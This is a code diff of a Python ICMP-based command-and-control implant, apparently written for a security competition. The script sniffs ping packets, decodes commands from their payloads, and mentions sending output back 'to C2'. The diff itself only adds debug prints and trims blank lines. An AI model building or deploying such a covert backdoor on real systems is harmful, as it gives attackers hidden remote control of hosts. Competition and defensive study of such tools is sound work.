@@ -17,14 +17,15 @@ def cmd_mon(pkt):
             print(f'Source IP:{pkt.getlayer(IP).src}')
         source = pkt.getlayer(IP).src
         instruct = pkt.getlayer(ICMP).load.decode()
+        print(instruct)
         cmd_proc(instruct, source)
-
 
 def cmd_proc(cmd, source):
     global verbose, fname
     prefix = cmd[0]
     term = cmd[1]
     cmd = cmd[3::]
+    print(f'Prefix:{prefix} term:{term} cmd:{cmd}')
     if prefix == "a":
         if term == "c":
             print("A")
@@ -64,8 +65,6 @@ def send_output(stdout, sender):
     print("sent to C2")
 
 
-
-
 """ May have to be from the server due to the fact that ping will be blocked in a competition on the inbound traffic 
 Or just checking to see if a response is recieved. IDK honestly. Gotta spend time drawing this out 
 def heart():
@@ -78,10 +77,8 @@ def heart():
     #time.sleep(15)
 """
 
-
 def sniffer():
     sniff(filter="icmp", prn=cmd_mon)
-
 
 def main():
     global verbose
